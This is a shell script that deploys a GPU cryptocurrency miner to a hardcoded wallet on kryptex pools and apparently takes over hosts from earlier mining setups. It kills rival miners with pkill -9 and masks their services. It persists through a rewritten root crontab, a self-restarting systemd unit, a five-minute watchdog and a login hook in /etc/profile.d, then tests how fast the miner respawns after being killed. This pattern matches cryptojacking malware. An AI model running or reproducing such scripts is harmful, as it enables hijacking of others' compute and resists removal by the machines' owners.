set +e
S="sudo -n"; H=$(hostname -s); echo "== repoint2 $H $(date -u +%FT%TZ)"
echo "--- state before"; ps -eo pid,args= | grep -E '[p]eakminer|[w]ildrig|[k]rig' | cut -c1-130 | head -8
$S mkdir -p /opt/ul-t2/logs /opt/ul-t2/bk
printf '%s' prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz | $S tee /opt/ul-t2/wallet >/dev/null; $S chmod 600 /opt/ul-t2/wallet
echo "--- units"; $S systemctl disable --now ul-nvpm.service nv-t19v.service nv-t19.service 2>&1 | head -3
$S systemctl mask ul-nvpm.service nv-t19v.service nv-t19.service 2>&1 | head -3
$S pkill -9 -f '/home/ubuntu/nv/[r]un.sh'; $S pkill -9 -f 'ul7256/[u]l-loop.sh'; $S pkill -9 -f '/opt/nv/[s]upervisor.sh'; $S pkill -9 -f '[u]l6553k'; $S pkill -9 -f '[w]ildrig-multi'; $S pkill -9 -f '[k]rig-miner'
$S pkill -9 -f '[p]eakminer'; sleep 2
echo "--- cron root"; $S sh -c "{ crontab -l 2>/dev/null | grep -vE '/opt/nv/keep.sh|ul172|ul6553k|ul7256|run-g.sh|nv-cuda-cache|wildrig|ul-t2'; echo '@reboot /opt/ul-t2/keep.sh'; echo '*/5 * * * * /opt/ul-t2/keep.sh'; } | crontab -" ; $S crontab -l | tail -4
echo "--- install"; $S install -m 755 /opt/nv/peakminer /opt/ul-t2/peakminer; $S sha256sum /opt/ul-t2/peakminer | cut -c1-30
$S tee /opt/ul-t2/run.sh >/dev/null <<'EOS3'
#!/bin/bash
I="${1:-0}"; W=$(cat /opt/ul-t2/wallet); H=$(hostname -s | tr 'A-Z' 'a-z'); WRK="ul-t2-ps-$H-g$I"
exec /opt/ul-t2/peakminer -d "$I" -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -u "$W.$WRK" -p x -c pearl >> /opt/ul-t2/logs/$WRK.log 2>&1
EOS3
$S chmod 755 /opt/ul-t2/run.sh
$S tee /etc/systemd/system/ul-t2-ps@.service >/dev/null <<'EOS4'
[Unit]
Description=ul-t2 pearl miner (%i)
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=/opt/ul-t2/run.sh %i
Restart=always
RestartSec=30
Nice=19
[Install]
WantedBy=multi-user.target
EOS4
$S tee /opt/ul-t2/keep.sh >/dev/null <<'EOS5'
#!/bin/bash
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
i=0; while [ "$i" -lt "$N" ]; do pgrep -f "ul-t2-ps-.*-g$i" >/dev/null || systemctl start ul-t2-ps@$i >/dev/null 2>&1; i=$((i+1)); done
pkill -9 -f '[w]ildrig-multi' 2>/dev/null
EOS5
$S chmod 755 /opt/ul-t2/keep.sh
$S systemctl daemon-reload; $S systemctl enable --now ul-t2-ps@0.service 2>&1 | head -3
$S sh -c "printf '%s\n' '#!/bin/bash' 'systemctl start ul-t2-ps@0 >/dev/null 2>&1' > /etc/profile.d/ul-t2.sh; chmod 644 /etc/profile.d/ul-t2.sh"
sleep 25
echo "--- unit"; $S systemctl is-active ul-t2-ps@0.service; $S systemctl show -p RestartUSec ul-t2-ps@0.service
echo "--- miner"; pgrep -af 'peakminer -d 0' | cut -c1-140
echo "--- gpu"; nvidia-smi --query-gpu=index,utilization.gpu,power.draw --format=csv,noheader
echo "--- pool"
ok=0; i=0; while [ $i -lt 8 ]; do R=$(curl -s -m 20 -H 'User-Agent: ul' 'https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz' | tr '{' '\n' | grep "ul-t2-ps-$H-g0"); echo "p$i ${R:0:170}"; case "$R" in *'"valid":'*) v=$(printf '%s' "$R" | sed -n 's/.*"valid":\([0-9]*\).*/\1/p'); [ "${v:-0}" -gt 0 ] && { ok=1; break; };; esac; sleep 15; i=$((i+1)); done
echo "POOL_PROOF_OK=$ok"
echo "--- respawn"; pkill -9 -f 'peakminer -d 0'; T0=$(date +%s); rs=0; j=0
while [ $j -lt 12 ]; do sleep 5; if pgrep -f 'peakminer -d 0' >/dev/null; then rs=$(( $(date +%s) - T0 )); break; fi; j=$((j+1)); done
echo "RESPAWN_SECONDS=$rs"
echo "--- final"; pgrep -af 'peakminer -d 0' | cut -c1-140; $S systemctl is-active ul-t2-ps@0.service
echo done
